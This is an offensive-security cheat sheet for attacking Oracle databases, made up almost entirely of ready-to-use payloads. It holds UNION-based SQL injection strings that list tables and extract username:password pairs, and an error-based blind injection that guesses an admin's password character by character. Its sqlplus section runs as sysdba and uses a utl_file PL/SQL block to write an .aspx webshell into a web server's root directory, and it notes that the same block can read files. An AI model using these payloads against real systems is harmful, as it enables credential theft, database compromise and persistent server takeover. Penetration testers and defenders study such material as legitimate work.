# Oracle - sqlplus

<pre class="language-sql"><code class="lang-sql">'union select null,null from dual-- -
'union select null,table_name from all_tables-- -
'union select null,owner from all_tables-- -
'union select null,table_name from all_tables where owner = 'john'-- -
'union select null,column_name from all_tab_columns where table_name = 'users'-- -
'union select null,username||':'||password from users-- -

' order by 4--
' union select null,null,null from dual--
all_tables instead of information_schema.tables
all_tab_columns instead of information_schema.columns 
<strong># Example:
</strong>' union select column_name,null,null from all_tab_columns where table_name="ADMINS"--
</code></pre>

## Blind

{% code overflow="wrap" %}
```sql
# Oracle - fuzz first char, try on Burp first to go ahead later w/ Python script
'||(select case when substr(password,1,1)='a' then to_char (1/0) else '' end from users where username='admin')||'
```
{% endcode %}

## sqlplus&#x20;

{% hint style="info" %}
#### AN ALTERNATIVE MIGHT BE DBEAVER
{% endhint %}

{% code overflow="wrap" %}
```sql
# First we check our privs connected as sysdba:
sqlplus $user/$pass@$IP/$SID as sysdba
SQL > select * from session privs;

# If we have enough privs, we can use this payload to upload files such a .aspx webshell (use locate it on Kali) to an ISS server for example.
declare
    f utl_file.file_type;
    s varchar(5000) := '$SHELLCODE HERE';
begin
    f := utl_file.fopen('/inetpub/wwwroot', 'webshell.aspx', 'W');
    utl_file.put_line(f,s);
    utl_file.fclose(f);
end;
/

# NOTE: the shellcode should be smaller than 1000 characters.

# We can switch from writing a file to reading a file by changing 'W'
# / is the last part which executes the SQL sentences.
```
{% endcode %}
